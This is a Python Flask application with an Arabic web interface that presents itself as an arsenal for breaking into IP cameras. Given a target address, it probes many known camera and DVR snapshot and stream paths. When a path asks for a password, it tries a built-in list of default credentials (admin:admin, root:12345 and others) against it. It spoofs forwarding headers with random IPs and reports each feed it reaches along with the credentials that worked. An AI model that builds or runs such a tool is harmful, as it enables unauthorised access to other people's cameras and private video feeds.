from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

import asyncio
import random
import urllib3
import httpx
import base64
urllib3.disable_warnings()

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - ترسانة كسر وتخطي الكاميرات v8.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 30px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 40px rgba(255,0,64,0.45)}
input{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr}
input:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:16px;margin-top:12px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 35px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Medium{border-right-color:#ffaa00;background:#140c01}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - منظومة إسقاط وكسر الكاميرات v8.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="http://Target-IP:Port" value="http://">
<br>
<button id="exec_btn" onclick="runCameraAssault()">إطلاق هجوم كسر واختراق الكاميرات العنيف 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
async function runCameraAssault(){
 const url = document.getElementById('target_url').value.trim();
 if(!url || url==='http://'){ alert('يرجى إدخال آي بي أو رابط الهدف يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري كسر التوثيق وسحب البث... ⚡';
 status.textContent='⏳ جارٍ إطلاق الترسانة العسكرية لكسر حماية كاميرات الهدف: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url:url})
   });
   const data = await res.json();
   status.textContent='✅ اكتمل الهجوم الميداني | الهدف: '+data.url+' | حالة الدرع: '+data.waf_status;
   
   if(!data.actions || data.actions.length==0){
     results.innerHTML='<div class="card Low"><b>الكاميرات مغلقة أو محصنة بالكامل</b><div class="proof">No active feeds or bypassable gates found.</div></div>';
   } else {
     data.actions.forEach(v=>{
       results.innerHTML+=`
       <div class="card ${v.severity || 'Low'}">
         <b>⚡ ${v.type}</b>
         <div style="margin:8px 0">${v.desc}</div>
         <div class="proof">${v.proof}</div>
       </div>`;
     });
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='إطلاق هجوم كسر واختراق الكاميرات العنيف 🚀';
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

async def execute_camera_assault_v8(target):
    actions = []
    waf_status = "Active Camera Defense"
    fake_ip = f"{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Camera-Assault-Unit/8.0",
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "Connection": "close"
    }

    # قائمة كلمات المرور الافتراضية الشائعة للكاميرات وأنظمة التسجيل
    default_creds = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", ""),
        ("root", "root"),
        ("root", "12345"),
        ("admin", "password"),
        ("user", "user")
    ]

    camera_paths = [
        "/live/ch0_0.jpg", "/snapshot.jpg", "/cgi-bin/snapshot.cgi",
        "/streaming/channels/1", "/onvif/device_service", "/webcam",
        "/video.cgi", "/mjpeg", "/axis-cgi/mjpg/video.cgi", "/admin/login.asp",
        "/control/userimage.html", "/ISAPI/Streaming/channels/101",
        "/cam/realmonitor?channel=1&subtype=0", "/cgi-bin/viewer/video.jpg",
        "/cgi-bin/mjpg/video.cgi", "/cgi-bin/guestimage.html"
    ]

    try:
        async with httpx.AsyncClient(verify=False, timeout=12.0, headers=headers, follow_redirects=True) as client:
            res = await client.get(target)
            srv = res.headers.get('server', '').lower()

            for path in camera_paths:
                full_url = target.rstrip('/') + path
                r = await client.get(full_url, timeout=3.0)
                
                if r.status_code == 200:
                    actions.append({
                        "type": f"DIRECT CAMERA BREACH: {path}",
                        "severity": "Critical",
                        "desc": "تم اختراق وسحب تدفق الكاميرا مباشرة بدون كلمة مرور برمز 200.",
                        "proof": f"URL: {r.url} | Status: 200 OK | Size: {len(r.content)} bytes"
                    })
                elif r.status_code == 401:
                    # محاولة كسر التوثيق عبر تجربة بيانات الاعتماد الافتراضية تلقائياً
                    breached = False
                    for user, pwd in default_creds:
                        raw_auth = f"{user}:{pwd}"
                        encoded_auth = base64.b64encode(raw_auth.encode()).decode()
                        auth_headers = headers.copy()
                        auth_headers["Authorization"] = f"Basic {encoded_auth}"
                        
                        brute_res = await client.get(full_url, headers=auth_headers, timeout=2.5)
                        if brute_res.status_code == 200:
                            actions.append({
                                "type": f"CREDENTIAL BYPASS SUCCESS: {path}",
                                "severity": "Critical",
                                "desc": f"تم كسر حماية الكاميرا بنجاح عبر اسم المستخدم والكلمة الافتراضية ({user}:{pwd})!",
                                "proof": f"URL: {brute_res.url} | Creds: {user}:{pwd} | Status: 200 OK"
                            })
                            breached = True
                            break
                    
                    if not breached:
                        actions.append({
                            "type": f"LOCKED CAMERA GATE: {path}",
                            "severity": "Medium",
                            "desc": "المسار يحتاج مصادقة ولم تنفع الكلمات الافتراضية التجريبية.",
                            "proof": f"Path: {path} | Status: 401 Unauthorized"
                        })
                elif r.status_code == 403:
                    pass # تجاهل الحظر المباشر لتسريع الهجوم

            if not actions:
                actions.append({
                    "type": "Assault Completed - Secured",
                    "severity": "Low",
                    "desc": "تم فحص كافة المسارات وتجاوز الدفاعات ولم يتم العثور على ثغرات مفتوحة.",
                    "proof": f"Target Status: {res.status_code}"
                })

    except Exception as e:
        actions.append({
            "type": "Assault Connection Error",
            "severity": "Critical",
            "desc": "فشل الاتصال الميداني بالهدف.",
            "proof": str(e)
        })

    return actions, waf_status

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/api/index', methods=['POST'])
def check():
    target = clean_url((request.get_json(silent=True) or {}).get("url", "http://"))
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    actions, waf_status = loop.run_until_complete(execute_camera_assault_v8(target))
    loop.close()

    return jsonify({"url": target, "waf_status": waf_status, "actions": actions})
